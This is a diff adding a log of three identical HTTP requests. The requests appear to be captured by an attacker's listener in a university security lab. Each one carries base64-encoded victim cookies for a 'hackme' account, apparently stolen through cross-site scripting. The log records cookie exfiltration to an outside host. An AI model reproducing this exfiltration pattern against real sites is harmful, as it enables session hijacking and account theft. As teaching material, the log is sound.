@@ -1,0 +1,30 @@
+GET /?cookie=aGFja21lPWE7IGhhY2ttZV9wYXNzPWNhOTc4MTEyY2ExYmJkY2FmYWMyMzFiMzlhMjNkYzRkYTc4NmVmZjgxNDdjNGU3MmI5ODA3Nzg1YWZlZTQ4YmI= HTTP/1.1
+Host: 10.176.161.19:5000
+Connection: keep-alive
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
+Accept: */*
+Origin: http://fiona.utdallas.edu
+Referer: http://fiona.utdallas.edu/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
+GET /?cookie=aGFja21lPWE7IGhhY2ttZV9wYXNzPWNhOTc4MTEyY2ExYmJkY2FmYWMyMzFiMzlhMjNkYzRkYTc4NmVmZjgxNDdjNGU3MmI5ODA3Nzg1YWZlZTQ4YmI= HTTP/1.1
+Host: 10.176.161.19:5000
+Connection: keep-alive
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
+Accept: */*
+Origin: http://fiona.utdallas.edu
+Referer: http://fiona.utdallas.edu/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
+GET /?cookie=aGFja21lPWE7IGhhY2ttZV9wYXNzPWNhOTc4MTEyY2ExYmJkY2FmYWMyMzFiMzlhMjNkYzRkYTc4NmVmZjgxNDdjNGU3MmI5ODA3Nzg1YWZlZTQ4YmI= HTTP/1.1
+Host: 10.176.161.19:5000
+Connection: keep-alive
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
+Accept: */*
+Origin: http://fiona.utdallas.edu
+Referer: http://fiona.utdallas.edu/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
